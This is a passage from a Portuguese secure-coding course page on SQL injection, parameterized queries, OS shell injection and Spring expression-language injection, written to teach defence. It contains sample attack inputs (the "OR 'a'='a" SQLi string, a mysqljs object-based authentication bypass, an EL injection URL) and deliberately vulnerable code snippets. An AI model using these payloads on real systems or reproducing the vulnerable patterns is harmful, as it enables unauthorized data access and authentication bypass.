de banco de dados inclui uma linguagem que permite criar consultas arbitrárias e, normalmente, muitas outras funções também (por exemplo, criar e modificar coisas).</p> <p>A linguagem SQL é especialmente comum e, embora alguns sistemas de banco de dados utilizem outras linguagens, essas linguagens frequentemente apresentam semelhanças com o SQL.</p> <p>Essas linguagens, incluindo o SQL, incluem metacaracteres.</p> <p>Quando invasores conseguem inserir metacaracteres em um comando SQL para causar um problema de segurança, o ataque é chamado de <em>ataque de injeção de SQL</em> e a vulnerabilidade é chamada de <em>vulnerabilidade de injeção de SQL</em>.</p> <p>A injeção de SQL às vezes é abreviada como SQLi.</p> <p>Mesmo que a linguagem do banco de dados não seja SQL, se for um ataque a uma linguagem para um sistema de banco de dados, é frequentemente chamado de ataque de injeção de SQL (embora isso não seja tecnicamente preciso). Vamos nos concentrar em SQL, porque SQL é muito comum e, depois que você entender como combater ataques de injeção de SQL, será fácil generalizar isso para qualquer linguagem de banco de dados.</p> <p>Aqui está um exemplo trivial; aqui está um trecho de Java que tenta fazer uma consulta SQL, mas o faz de forma insegura:</p> <p><strong>String QueryString = "select * from authors where lastname = ' " +    search_lastname + " '; "; // CÓDIGO VULNERÁVEL    rs = statement.executeQuery(QueryString); // CÓDIGO VULNERÁVEL</strong></p> <p>A intenção é clara: se <strong>search_lastname</strong> tiver o valor <strong>Fred</strong> , o banco de dados receberá a consulta <strong>"select * from authors where lastname='Fred';"</strong> — uma consulta SQL razoável. Mas lembre-se dos nossos sinais de alerta: este código concatena strings, alguns desses dados provavelmente são fornecidos por um invasor, e estamos fazendo algo chamado "execute". Os sinais de alerta estão corretos. Imagine que o invasor fornece a entrada <strong>"Fred' OR 'a'='a"</strong>. Isso produzirá a consulta <strong>"select * from authors where lastname='Fred' OR 'a'='a';"</strong> e agora o invasor pode recuperar todo o banco de dados. O invasor pode até mesmo modificar ou excluir dados dessa forma, dependendo de vários fatores. Este é um exemplo simples de um ataque de injeção de SQL; um invasor pode inserir alguns caracteres e injetar comandos novos ou modificados.</p> <p>Existem muitas maneiras de desencadear ataques de injeção de SQL; os invasores podem inserir aspas simples (usadas para envolver dados de caracteres constantes), ponto e vírgula (que atuam como separadores de comandos), " <strong>--</strong> ", que é um token de comentário, e assim por diante. Esta não é uma lista completa; diferentes sistemas de banco de dados interpretam caracteres diferentes de forma diferente. Por exemplo, aspas duplas geralmente são metacaracteres, mas com significados diferentes. Mesmo versões diferentes do <em>mesmo</em> sistema de banco de dados, ou configurações diferentes, podem causar alterações na forma como os caracteres são interpretados. Já sabemos que não devemos criar uma lista de caracteres "ruins", pois isso é uma lista de negação. Poderíamos criar uma lista de permissão de caracteres que sabemos que não são metacaracteres e, em seguida, ignorar o restante, mas esse processo é difícil de executar corretamente em SQL.</p> <p>Não concatene strings para criar uma consulta ao SGBD, pois isso é inseguro por padrão. Isso inclui o uso de strings de formato, interpolações de strings, modelos de strings e todos os outros mecanismos que simplesmente concatenam texto. Por exemplo, as mesmas vulnerabilidades ocorrem se você usar literais de string formatados em Python (strings f como <strong>f'{year}-{month}' ), o método</strong> <strong>.format</strong> do Python , strings de modelo do JavaScript ( <strong><code>${year}-${month}</code></strong> ), interpolações de strings do PHP ( <strong>"<span class=arithmatex month=month>\({year}-\)</span>"</strong> ), interpolação de strings do Ruby ( <strong>"#{year}-#{month}"</strong> ), modelos Go (string) ou qualquer outro modelo ou linguagem de formatação baseada em strings. Lembre-se: queremos tentar usar uma rotina que seja fácil de usar com segurança, e todos esses são perigosos por padrão quando usados ​​para criar comandos como comandos SQL.</p> <p>Muitos desenvolvedores tentam consertar isso de uma forma imprudente, chamando uma rotina de escape para cada valor, por exemplo, assim:</p> <p><strong>String QueryString = "select * from authors where lastname = ' " + sql_escape(search_lastname) + " '; "; // MÁ IDEIA</strong></p> <p>Essa abordagem (chamar uma rotina de escape toda vez que você usa uma entrada não confiável) tem uma falha fundamental: o <em>padrão</em> é inseguro. Se uma rotina de escape precisar ser chamada toda vez que dados não confiáveis ​​forem usados, e houver muitos usos para dados não confiáveis, eventualmente alguém se esquecerá de chamar a função de escape. Muitos programas criam muitas consultas, então há muitas oportunidades para se esquecer de fazê-lo. O erro pode acontecer no início ou mais tarde, quando o código for modificado, mas a experiência mostra que o erro <em>acontecerá</em></p> <p>Mais uma vez, queremos tentar usar uma abordagem que seja fácil de usar corretamente: ela precisa ser segura por padrão.</p> <p>Para bancos de dados, existem soluções conhecidas que são muito mais fáceis de usar com segurança.</p> <h2 id=injecao-de-sql-instrucoes-parametrizadas>Injeção de SQL: Instruções Parametrizadas<a class=headerlink href=#injecao-de-sql-instrucoes-parametrizadas title="Permanent link">¶</a></h2> <p>Vulnerabilidades de injeção de SQL são uma das mais comuns e devastadoras, especialmente em aplicações web. Elas também são fáceis de combater, desde que você saiba como fazê-lo.</p> <p><em>Instruções parametrizadas</em> , também conhecidas como <em>consultas parametrizadas</em> , são talvez a melhor maneira de combater ataques de injeção de SQL se você estiver criando comandos SQL diretamente que precisam ser seguros. Instruções parametrizadas são instruções que permitem identificar espaços reservados (geralmente um "?") para dados que precisam ser escapados. Uma biblioteca preexistente que você chama então recebe esses parâmetros e, na prática, escapa os dados corretamente para aquela implementação específica. A sintaxe exata para espaços reservados depende da biblioteca e/ou banco de dados que você está usando.</p> <p>Para nossos propósitos, uma <em>instrução preparada</em> compila a instrução com o sistema de banco de dados antecipadamente para que uma solicitação posterior com dados específicos possa ser executada com mais eficiência. Preparar uma instrução com um banco de dados antecipadamente pode melhorar o desempenho se a instrução for executada várias vezes. APIs de instruções preparadas geralmente incluem suporte para instruções parametrizadas, e muitas pessoas (e APIs) usam os termos "instrução preparada" e "instrução parametrizada" como sinônimos.</p> <p>Por questões de segurança, a chave é usar uma API com instruções parametrizadas (incluindo uma API de instruções preparadas) e garantir que cada entrada não confiável seja enviada como um parâmetro separado. Certifique-se de não <em>incluir</em> entradas não confiáveis ​​concatenando dados não confiáveis ​​como uma string (incluindo uma string formatada) em uma solicitação.</p> <h2 id=vantagens-das-instrucoes-parametrizadaspreparadas>Vantagens das instruções parametrizadas/preparadas<a class=headerlink href=#vantagens-das-instrucoes-parametrizadaspreparadas title="Permanent link">¶</a></h2> <p>A maioria das linguagens de programação possui pelo menos uma biblioteca que implementa instruções parametrizadas e/ou preparadas. O uso de instruções parametrizadas, incluindo instruções preparadas, apresenta muitas vantagens:</p> <ul> <li>Como a biblioteca faz o escape para você, é mais simples de usar e tem mais probabilidade de estar certo.</li> <li>Ele tende a produzir um código mais fácil de manter, pois o código tende a ser mais fácil de ler.</li> <li>Muitos podem lidar com variações em diferentes mecanismos SQL (o que é importante porque sistemas diferentes geralmente têm regras de sintaxe diferentes).</li> </ul> <h1 id=exemplo-instrucoes-preparadas-em-java>Exemplo: Instruções preparadas em Java<a class=headerlink href=#exemplo-instrucoes-preparadas-em-java title="Permanent link">¶</a></h1> <p>Aqui está um exemplo de uso de instruções preparadas em Java usando sua interface JDBC:</p> <div class=highlight><pre><span></span><code>String QueryString = "select * from authors where lastname = ?";
PreparedStatement pstmt = connection.prepareStatement(QueryString);
pstmt.setString(1, search_lastname);
ResultSet results = pstmt.execute( );
</code></pre></div> <p>Há mais instruções do que no exemplo anterior, mas as instruções são mais simples. Em particular, a concatenação complexa agora é uma constante de string simples. Ainda chamamos algo chamado " <em>execute</em> " — mas lembre-se: evitar métodos chamados "execute" é apenas uma regra prática para nos ajudar a detectar possíveis problemas.</p> <p><strong>Observação:</strong> Algumas bibliotecas de instruções parametrizadas e/ou preparadas não são seguras para threads. Em outras palavras, algumas bibliotecas assumem que, a qualquer momento, apenas uma única thread pode acessar uma instância. Isso se aplica à API de instruções preparadas Java usada aqui; esta API Java não é segura para threads. Portanto, ao usar esta interface Java, defina apenas objetos <strong>PreparedStatement</strong> como variáveis ​​de nível de método (em vez de variáveis ​​de nível de classe) para reduzir o risco de problemas de segurança de threads, conforme sugerido por <a href=https://bobby-tables.com/java>Bobby Tables (Java)</a>.</p> <p>É claro que, como qualquer técnica, se você usá-la incorretamente, ela não será segura. Aqui está um exemplo de como usar instruções preparadas em Java para produzir um programa provavelmente inseguro:</p> <div class=highlight><pre><span></span><code>String QueryString = "select * from authors where lastname = '" + search_lastname + "';";
PreparedStatement pstmt = connection.prepareStatement(QueryString);
ResultSet results = pstmt.execute( ); // Probably insecure, don’t do this!
</code></pre></div> <p>Este programa inseguro usa uma instrução preparada, mas em vez de usar corretamente " <strong>?</strong> " como um espaço reservado para valor (que será então devidamente escapado), este código concatena os dados diretamente na consulta. A menos que os dados sejam devidamente escapados (e quase certamente não são), este código pode rapidamente levar a uma vulnerabilidade grave se esses dados puderem ser controlados por um invasor.</p> <h2 id=exemplos-instrucoes-parametrizadas-e-preparadas-em-algumas-outras-linguagens>Exemplos: Instruções parametrizadas e preparadas em algumas outras linguagens<a class=headerlink href=#exemplos-instrucoes-parametrizadas-e-preparadas-em-algumas-outras-linguagens title="Permanent link">¶</a></h2> <p>Instruções parametrizadas e preparadas estão amplamente disponíveis, embora as APIs e a sintaxe dos espaços reservados variem de acordo com a linguagem de programação, biblioteca e banco de dados. Aqui, veremos alguns exemplos.</p> <p>Em Python, existem diversas bibliotecas que fazem interface com bancos de dados. Muitas delas implementam a Especificação da API de Banco de Dados Python v2.0 ( <a href=https://peps.python.org/pep-0249/ >PEP 249</a> ), cujos métodos <strong>execute</strong> e <strong>executemany</strong> implementam instruções parametrizadas. A sintaxe de espaço reservado da biblioteca é relatada pelo seu atributo <strong>paramstyle</strong>. Aqui está um exemplo simples de Python da documentação da biblioteca Python <a href=https://docs.python.org/3/library/sqlite3.html>sqlite3</a> :</p> <p><strong>con = sqlite3.connect(...) cur = con.cursor() cur.execute("insert into test(d, ts) values (?, ?)", (today, now))</strong></p> <p>Aqui está um exemplo de uma consulta em go da <a href=https://go.dev/doc/database/querying>documentação go.dev sobre consultas</a> :</p> <p><strong>rows, err := db.Query("SELECT * FROM album WHERE artist = ?", artist)</strong></p> <p>Ao usar Node e JavaScript, há muitas maneiras de usar instruções parametrizadas e preparadas. Aqui está um exemplo usando a interface de retorno de chamada node-postgres, conforme descrito na <a href=https://node-postgres.com/features/queries>documentação do node-postgres</a> :</p> <p><strong>const text = 'INSERT INTO users(name, email) VALUES($1, $2) RETURNING *' const values = ['brianc', '<a href=mailto:brian.m.carlson@gmail.com>brian.m.carlson@gmail.com</a>'] client.query(text, values, (err, res) =&gt; {.... })</strong></p> <p>A interface C <strong>libpq</strong> do PostgreSQL fornece diversas funções, conforme explicado na <a href=https://www.postgresql.org/docs/current/libpq-exec.html>documentação do PostgreSQL (Funções de Execução de Comando)</a> :</p> <ul> <li><strong>PQexec</strong> executa diretamente um único comando de string e retorna um resultado.</li> <li><strong>PQexecParams</strong> implementa uma instrução parametrizada. Os espaços reservados são representados no comando como <strong><span class=arithmatex>\(1** , **\)</span>2</strong> , etc., e os valores dos parâmetros são fornecidos como parâmetros separados na mesma chamada.</li> <li><strong>O PQprepare</strong> implementa uma instrução preparada. Ele recebe uma instrução com espaços reservados e a envia ao banco de dados para ser preparada. Os usuários podem posteriormente usar a chamada separada <strong>PQexecPrepared</strong> para fornecer os valores dos parâmetros de espaço reservado e executar o comando resultante.</li> </ul> <p>O site <a href=https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html>OWASP Query Parameterization Cheat Sheet</a> e <a href=https://bobby-tables.com/ >Bobby Tables</a> fornece exemplos para uma variedade de ecossistemas.</p> <h1 id=injecao-de-sql-lado-do-sgbd-servidor-vs-lado-da-aplicacao-cliente>Injeção de SQL: Lado do SGBD (Servidor) vs. Lado da Aplicação (Cliente)<a class=headerlink href=#injecao-de-sql-lado-do-sgbd-servidor-vs-lado-da-aplicacao-cliente title="Permanent link">¶</a></h1> <p>Uma questão de segurança importante, porém sutil, ao usar instruções parametrizadas é <em>onde</em> os parâmetros de uma instrução parametrizada são processados. Há duas opções: no lado do SGBD e no lado da aplicação.</p> <p>Do ponto de vista da segurança, é melhor que os parâmetros das instruções parametrizadas sejam processados ​​diretamente no sistema de gerenciamento de banco de dados (SGBD), também conhecido como processamento de parâmetros "do lado do SGBD".</p> <p>Essa abordagem costuma ser chamada de <strong>"do lado do servidor"</strong>, pois muitos SGBDs utilizam uma arquitetura cliente/servidor, na qual o cliente se conecta por meio de uma rede a um SGBD do lado do servidor.</p> <p>O SGBD possui informações atualizadas sobre regras de escape (e muitas vezes pode usar mecanismos mais eficientes do que adicionar caracteres de escape) e também outras informações, como as codificações de caracteres relevantes e os tipos de dados esperados. Talvez o mais importante seja que os desenvolvedores de SGBD normalmente solicitam que especialistas em segurança revisem essa parte do sistema SGBD. No entanto, o processamento de parâmetros do lado do SGBD pode exigir mais esforço para ser implementado, portanto, algumas bibliotecas utilizam o processamento de parâmetros do "lado da aplicação".</p> <p>O processamento de parâmetros "do lado da aplicação" ocorre quando o escape de parâmetros ocorre dentro de uma biblioteca <em>que não</em> está no SGBD, mas sim no espaço de processamento da aplicação. Isso também é chamado de processamento de parâmetros "do lado do cliente". Os sistemas de processamento de parâmetros do lado da aplicação geralmente são implementados inserindo caracteres de escape diretamente onde são necessários. O processamento de parâmetros do lado da aplicação costuma ser mais fácil de implementar, portanto, diversas bibliotecas de SGBD utilizam essa abordagem. Bibliotecas do lado da aplicação são melhores do que chamar diretamente um mecanismo de escape "manualmente" a cada uso, pois os escapes são adicionados automaticamente.</p> <p>Infelizmente, o processamento de parâmetros do lado da aplicação tem uma fragilidade: o lado da aplicação pode interpretar as informações de forma diferente do SGBD. Essa fragilidade pode levar a vulnerabilidades. Por exemplo:</p> <ul> <li>A biblioteca do lado do aplicativo pode ser destinada a uma versão diferente do SGBD. O SGBD pode ter uma lista diferente de caracteres ou situações que precisam ser escapados.</li> <li>A biblioteca do lado do aplicativo pode interpretar caracteres multibyte de forma diferente ou não escapar caracteres multibyte corretamente para a circunstância que realmente existe no lado do DBMS. (Consulte <a href=https://security.stackexchange.com/questions/9908/multibyte-character-exploits-php-mysql>Explorações de caracteres multibyte em PHP/MySQL</a>.)</li> <li>Se a biblioteca do lado da aplicação implementar a parametrização de tipos de dados mais complexos do que números e strings (como matrizes, objetos, matrizes associativas e/ou dicionários), haverá um risco significativo de vulnerabilidade. O problema fundamental é que a biblioteca do lado da aplicação não está necessariamente analisando a linguagem de consulta da mesma forma que o SGBD faria – geralmente, ela está fazendo substituições de texto simples. Portanto, se a biblioteca implementar essa funcionalidade, normalmente precisará fazer <em>suposições</em> sobre quais tipos são esperados. Por exemplo, ela pode supor que matrizes associativas só são enviadas à biblioteca quando isso for sensato na consulta SQL parametrizada. Essa suposição, infelizmente, pode ser explorável. Isso é especialmente um risco em linguagens que não exigem tipos estáticos (conhecimento dos tipos em tempo de compilação), pois é muito mais fácil inserir tipos complexos inesperados em uma biblioteca que nem sempre consegue lidar com eles com segurança. Por exemplo, a biblioteca MySQL <a href=https://github.com/mysqljs/mysql>mysqljs/mysql</a> do Node.js amplamente utilizada no início de 2022 é frequentemente explorável por meio de sua biblioteca parametrizada <em>se</em> um objeto JavaScript puder ser enviado como um parâmetro para ela (veja <a href="https://maxwelldulin.com/BlogPost?post=9185867776">Encontrando um desvio de autorização no meu próprio site</a> por Maxwell Dulin (ꓘ)).</li> </ul> <p>O último problema com o processamento do lado do aplicativo (que tipos de dados complexos nem sempre podem ser escapados corretamente) pode ser confuso, então um exemplo pode ajudar. Na biblioteca mysqljs/mysql do Node.js, imagine que um invasor consegue fornecer o <em>objeto JavaScript</em> <strong>{senha = 1}</strong> como parâmetro de senha (não é apenas uma string, mas um objeto JavaScript real). Agora imagine que esse objeto é usado na consulta SQL <strong>SELECT * FROM accounts WHERE username = ? AND senha = ?</strong> (observe que isso é parametrizado). A biblioteca expandirá internamente a expressão após <strong>AND</strong> para <strong>password = 'password' = 1</strong> , sem perceber que um objeto JavaScript não faz sentido no contexto dessa consulta (uma string ou número seria esperado aqui). O SGBD MYSQL interpretará <strong>senha = 'senha'</strong> como 1 (true) e, em seguida, determinará que <strong>1 = 1</strong> é true. O resultado: essa expressão <em>sempre</em> será true. Esse escape incorreto de um tipo de dado complexo é suficiente para ignorar completamente a autenticação em algumas situações.</p> <p>Infelizmente, esse último problema pode ser um desafio para resolver:</p> <ol> <li>A solução segura é garantir que tipos de dados complexos (tipos diferentes de números e strings) não sejam expandidos por bibliotecas do lado do aplicativo, a menos que o desenvolvedor os marque especificamente como permitidos. Isso pode ser impraticável se o aplicativo já depender disso, e a biblioteca pode não fornecer uma maneira de desabilitar completamente a funcionalidade. Por exemplo, mysqljs/mysql permite definir <strong>stringifyObjects</strong> como true ao chamar <strong>mysql.createConnection</strong> , mas embora isso possa ajudar, isso apenas desabilita o escape de objetos genéricos – não desabilita outros tipos de dados complexos, como arrays.</li> <li>A solução geral é verificar cada tipo antes de chamar a biblioteca. Por exemplo, exija que todos os dados que se espera que sejam strings sejam strings. Isso normalmente é fácil de fazer em uma linguagem estaticamente tipada se a linguagem impõe os tipos – basta declarar o tipo necessário. A implementação pode levar muito tempo em linguagens que não impõem tipos estáticos, e também existe o risco de perder uma verificação ao criar ou modificar o código. No entanto, essa abordagem é mais flexível. (Consulte " <a href=https://flattsecurity.medium.com/finding-an-unseen-sql-injection-by-bypassing-escape-functions-in-mysqljs-mysql-90b27f6542b4>Encontrando uma injeção de SQL não identificada ignorando funções de escape em mysqljs/mysql</a> " da Flatt Security Inc., 21/02/2022.)</li> </ol> <p>Muitas vezes, é difícil determinar se uma biblioteca utiliza parametrização do lado do SGBD ou do lado da aplicação e, em algumas circunstâncias, apenas uma abordagem do lado da aplicação está disponível. Em alguns casos, solicitar uma instrução preparada força a biblioteca a utilizar o processamento do lado do SGBD, mas não presuma isso – consulte a documentação. Se você tiver uma opção prática, prefira uma implementação do lado do SGBD. Caso contrário, valide cuidadosamente a entrada e os dados que chegam à biblioteca para garantir que sejam dos tipos apropriados.</p> <p>Este é um bom exemplo de um problema geral de segurança, ou seja, diferentes componentes podem interpretar a mesma entrada de forma diferente. Em alguns casos, um invasor pode explorar isso, fazendo com que sua entrada pareça benigna para uma parte, enquanto realiza algo malicioso para outra.</p> <h2 id=injecao-de-sql-alternativas-para-instrucoes-parametrizadas-procedimentos-armazenados>Injeção de SQL: Alternativas para Instruções Parametrizadas - Procedimentos Armazenados<a class=headerlink href=#injecao-de-sql-alternativas-para-instrucoes-parametrizadas-procedimentos-armazenados title="Permanent link">¶</a></h2> <p>Os sistemas de banco de dados são amplamente utilizados, portanto, há muitas maneiras de interagir com eles.</p> <p>Muitos sistemas de banco de dados suportam "procedimentos armazenados", ou seja, procedimentos incorporados ao próprio banco de dados. Se você usa procedimentos armazenados e comandos (como consultas) são construídos dinamicamente neles, você pode ter vulnerabilidades de injeção de SQL novamente.</p> <p>Novamente, a melhor solução geralmente é usar um mecanismo de consulta parametrizado ao criar o comando dinâmico (por exemplo, o SQL) dentro do procedimento armazenado. Tenha cuidado; em alguns sistemas, usá-los corretamente pode ser um pouco complicado.</p> <p>Para obter mais informações sobre o uso de consultas parametrizadas em procedimentos armazenados, consulte a documentação da sua biblioteca, a <a href=https://cheatsheetseries.owasp.org/cheatsheets/Query_Parameterization_Cheat_Sheet.html#stored-procedure-examples>OWASP Query Parameterization Cheat Sheet</a> e a <a href=https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html>OWASP SQL Injection Prevention Cheat Sheet</a>.</p> <h2 id=quando-instrucoes-parametrizadas-nao-funcionam>Quando instruções parametrizadas não funcionam<a class=headerlink href=#quando-instrucoes-parametrizadas-nao-funcionam title="Permanent link">¶</a></h2> <p>Em algumas situações, instruções parametrizadas (incluindo instruções preparadas) <em>não</em> funcionarão.</p> <p>Muitas APIs de instruções parametrizadas permitem apenas a substituição de valores SQL, portanto, não permitem a variação de informações como nomes de tabelas, nomes de colunas ou a direção da ordem de classificação.</p> <p>Nesses casos, pode ser necessário criar uma consulta concatenando os dados.</p> <p>Nesses casos, <em>certifique-se</em> de validar cuidadosamente os dados (usando uma lista de permissões) para que apenas valores específicos e seguros sejam permitidos.</p> <p>Muitas vezes, a lista de permissões é uma lista resumida de valores permitidos ou, no máximo, uma expressão simples que permite apenas letras e dígitos ASCII. Um risco dessa abordagem é que, se a validação for ignorada (por exemplo, após alguma alteração no código), o sistema pode se tornar extremamente vulnerável.</p> <p>O <a href=https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html>OWASP SQL Injection Prevention Cheat Sheet</a> tem uma boa sugestão: se você <em>precisar</em> fazer essa concatenação, torne a entrada do usuário <em>diferente</em> do que você realmente usará e, no programa, mapeie a entrada do usuário para os valores que você usará. Se a entrada do usuário não tiver um mapeamento válido, rejeite a entrada. Isso aumenta a probabilidade de que uma alteração no programa não resulte na concatenação de uma entrada não validada em uma consulta ou que o problema seja detectado antes do envio. Por exemplo, em Python, se você precisar escrever em um nome de tabela fornecido pelo usuário, você pode fazer o seguinte:</p> <p><strong>table_name_untrusted = request.get("table_name") # Isto não é confiável, não coloque isso diretamente na consulta! table_name_map = {"table1": "db.table1", "table2": "db.table2"} table_name = table_name_map[table_name_untrusted] con = sqlite3.connect(...) cur = con.cursor()</strong> <strong>cur.execute(f"insert into {table_name}(d, ts) values ​​(?, ?)", (today, now)) # Isto é seguro porque sabemos que table_name só pode receber valores confiáveis ​​de table_name_map</strong></p> <h1 id=outras-abordagens-para-combater-a-injecao-de-sql>Outras abordagens para combater a injeção de SQL<a class=headerlink href=#outras-abordagens-para-combater-a-injecao-de-sql title="Permanent link">¶</a></h1> <p>Muitos programas usam mapeamento objeto-relacional (ORM).</p> <p>Esta é apenas uma técnica para converter automaticamente dados de um banco de dados relacional em um objeto em uma linguagem de programação orientada a objetos e vice-versa; muitas bibliotecas e frameworks farão isso por você. Isso é aceitável, desde que o ORM seja implementado usando instruções parametrizadas ou algo equivalente.</p> <p>Na prática, qualquer boa implementação de ORM fará isso. Portanto, se você estiver usando um ORM respeitado, já estará fazendo isso. Dito isso, é comum em sistemas que usam ORMs ocasionalmente precisar usar consultas SQL diretamente... e, quando isso acontecer, use instruções parametrizadas ou instruções preparadas.</p> <p>Alguns aplicativos usam uma biblioteca de "construtor de consultas" para construir comandos (consultas) programaticamente por meio de uma sequência de chamadas, em vez de incorporar uma string de comando.</p> <p>Alguns ORMs incluem um sistema de construtor de consultas.</p> <p>Novamente, um construtor de consultas bem implementado usará instruções parametrizadas ou similares internamente. Portanto, se você usar um construtor de consultas, use um que seja implementado usando instruções parametrizadas e forneça dados não confiáveis ​​como parâmetros separados para que o construtor de consultas possa usar as instruções parametrizadas corretamente.</p> <p>Existem outras abordagens, é claro. Você pode escrever seu próprio código de escape, mas isso é difícil de acertar e, normalmente, uma perda de tempo, já que geralmente existem bibliotecas para fazer o trabalho.</p> <p>Em resumo, o uso adequado de bibliotecas de instruções parametrizadas facilita muito a escrita de código seguro. Além disso, elas geralmente facilitam a leitura do código, tratam automaticamente as variações entre como os bancos de dados escapam de algo e, às vezes, são mais rápidas do que executar você mesmo os escapes de metacaracteres.</p> <h1 id=injecao-de-comando-shell-do-so>Injeção de Comando (Shell) do SO<a class=headerlink href=#injecao-de-comando-shell-do-so title="Permanent link">¶</a></h1> <p>Outro tipo de ataque de injeção é o ataque de injeção no sistema operacional (SO), também conhecido como ataque de injeção de shell.</p> <p>É semelhante a um ataque de injeção de SQL; o problema é que as informações (geralmente texto), algumas delas confiáveis ​​e outras provenientes de um invasor, são enviadas a um interpretador que as executa. A diferença é que, em vez de serem enviadas a um banco de dados, essa mistura é enviada ao interpretador de comandos do SO, também conhecido como shell de comando.</p> <p>A maioria dos sistemas possui pelo menos um shell de comando.</p> <p>Mesmo pequenos sistemas embarcados, como televisores e roteadores, geralmente possuem um shell de comando. Shells são úteis para muitas coisas, incluindo combinar programas rapidamente, realizar consultas, depurar e assim por diante.</p> <p>Muitos sistemas do tipo Unix, incluindo distribuições Linux típicas, possuem vários shells disponíveis, incluindo bash, dash, ksh, zsh e csh; pelo menos um deles é instalado como <strong>/bin/sh</strong> ou <strong>/usr/bin/sh</strong>.</p> <p>O macOS também vem com um shell, e outros podem ser facilmente instalados. Os sistemas Windows normalmente usam shells diferentes, com sintaxes muito diferentes ( <strong>cmd.exe</strong> , <strong>command.exe</strong> ou PowerShell), mas também possuem shells.</p> <p>Um shell é um programa que recebe comandos diretamente e executa programas conforme solicitado. Como isso é útil, muitas linguagens de programação facilitam a chamada para um shell. Em particular, muitas linguagens têm uma maneira de construir dinamicamente uma chamada para um shell e, em seguida, executá-la. No entanto, é fácil cometer erros ao combinar dados do invasor em um comando a ser executado por um shell. Em particular, tente evitar criar dinamicamente uma mistura de comandos e dados fornecidos pelo invasor para serem executados pelo shell. Em vez disso, tente encontrar uma alternativa que seja mais fácil de usar com segurança.</p> <p>Se tudo o que você quer fazer é chamar outro programa e passar alguns parâmetros, tente fazer isso sem criar dinamicamente e depois interpretar um comando shell! Em vez disso, tente chamar o programa diretamente. Isso é mais eficiente de qualquer maneira, e é muito mais fácil (e provavelmente mais) seguro se algum desses parâmetros puder incluir dados de um invasor. Por exemplo:</p> <ul> <li>Em C, prefira <strong>execve(3)</strong> (ele não usa o shell) em vez de usar <strong>system(3)</strong> (que usa o shell).</li> <li>Em Python, prefira usar <strong>shell=False</strong> (o padrão) com <strong>subprocess.run()</strong> ou <strong>subprocess.call()</strong> , em vez de usar <strong>shell=True</strong> ou <strong>os.system()</strong></li> <li>Em JavaScript Node.js, prefira usar <strong>shell=False</strong> (o padrão) com <strong>child_process.spawn()</strong> ou <strong>child_process.execFile()</strong> em vez de usar <strong>shell=True</strong> ou <strong>child_process.exec()</strong>.</li> </ul> <p>Resumindo: se você vir código que concatena strings (incluindo strings formatadas) para execução por um shell, e essa concatenação incluir entradas não confiáveis, fique extremamente preocupado. Embora seja possível fazer isso com segurança, é melhor evitá-lo sempre que possível.</p> <p>Se você precisar chamar um programa por meio de um shell e também incluir alguns dados que possam ser fornecidos por um invasor, precisará usá-lo com segurança. Isso é bastante complicado. Como sempre, <em>não use uma lista de negação</em>. Existem muitas "listas de metacaracteres de shell" que estão erradas porque omitem alguns. Portanto, se estiver enviando dados por meio de um shell, será necessário escapar todos os caracteres, exceto aqueles em uma lista de permissões (caracteres que você sabe que <em>não</em> são metacaracteres). Geralmente, AZ, az e 0-9 não são metacaracteres; depois disso, verifique com muito cuidado. Certifique-se de colocar aspas em tudo, conforme necessário.</p> <p>É claro que, se você estiver chamando um programa com dados que possam ser de um invasor, precisará garantir que os dados não sejam mal interpretados. Por exemplo, certifique-se de que suas opções de linha de comando sejam interpretadas corretamente; se um invasor conseguir fazer com que o caractere inicial seja " <strong>-</strong> " ou " <strong>/</strong> " em um parâmetro, ele poderá ser mal interpretado como uma opção ou diretório raiz. Qualquer coisa passada (por exemplo, por parâmetro ou qualquer outra coisa) deve ser cuidadosamente escapada para evitar ataques. Isso nos leva ao tópico de nomes de arquivos, que abordaremos a seguir.</p> <h1 id=outros-ataques-de-injecao>Outros ataques de injeção<a class=headerlink href=#outros-ataques-de-injecao title="Permanent link">¶</a></h1> <p>Existem muitos outros tipos de ataques de injeção além da injeção de SQL e da injeção de comandos do sistema operacional.</p> <p>Pode haver risco de um ataque de injeção sempre que você enviar dados parcialmente controlados por um usuário não confiável em um formato que contenha metacaracteres, seja definido como uma linguagem e/ou seja processado por um interpretador.</p> <p>Exemplos onde pode haver risco de vulnerabilidade de injeção incluem gerar e enviar comandos JSON, YAML, XML, Lightweight Directory Access Protocol (LDAP) e muitos outros formatos para bibliotecas, frameworks e outros componentes dos quais você depende, bem como enviá-los para usuários eventuais.</p> <p>Em todos os casos, uma solução é usar uma API que escape o texto automaticamente conforme necessário, assim como usar instruções parametrizadas ao gerar SQL.</p> <p>Uma variação interessante de um ataque de injeção ocorre quando uma expressão é executada <em>duas vezes</em> involuntariamente.</p> <p>Isso pode ocorrer, por exemplo, em alguns usos da linguagem de expressão no framework Spring Java amplamente utilizado, onde o ataque é chamado de injeção de linguagem de expressão. Essa vulnerabilidade é notavelmente comum, por isso a explicaremos mais detalhadamente aqui.</p> <p>Uma "Linguagem de Expressão" (EL) foi desenvolvida como parte da Biblioteca de Tags Padrão de Páginas de Servidor Java (JSTL) para facilitar a obtenção de dados do modelo de objeto subjacente. Por exemplo:</p> <p><strong><c:out value=pessoa.endereço.rua></c:out></strong> </p> <p>É uma abreviação conveniente para:</p> <p><strong>&lt;%=HTMLEncoder.encode(((Pessoa)pessoa).getAddress().getStreet())%&gt;</strong></p> <p>O problema é que, em alguns casos, é possível que a EL seja interpretada <em>duas vezes</em> ao usar o Spring, dadas certas versões e configurações.</p> <p>Por exemplo, as tags <strong>spring:message</strong> e <strong>spring:theme</strong> podem interpretar duas vezes os seguintes atributos: <strong>arguments</strong> , <strong>code</strong> , <strong>text</strong> , <strong>var</strong> , <strong>scope</strong> e <strong>message</strong>. Para outro exemplo, <strong>spring:bind</strong> e <strong>spring:nestedpath</strong> podem interpretar duas vezes o atributo <strong>path</strong>.</p> <p>Quando isso acontece, conforme observado em “ <a href=http://danamodio.com/appsec/research/spring-remote-code-with-expression-language-injection/ >Código Remoto com Injeção de Linguagem de Expressão</a> ” por Amodio (2012), trata-se de uma requisição do tipo:</p> <p><strong><a href="http://vulnerable.com/foo?message=${applicationScope">http://vulnerable.com/foo?message=${applicationScope</a>}</strong></p> <p>para uma página que contém:</p> <p><strong><spring:message code="${param['message']}" text></spring:message></strong></p> <p>pode resultar em uma saída que contém informações internas do servidor, incluindo o classpath e os diretórios de trabalho locais.</p> <p>A ocorrência ou não do problema depende da versão do Spring, do contêiner Java Server Pages/Servlet (se presente) e de algumas opções de configuração. Para 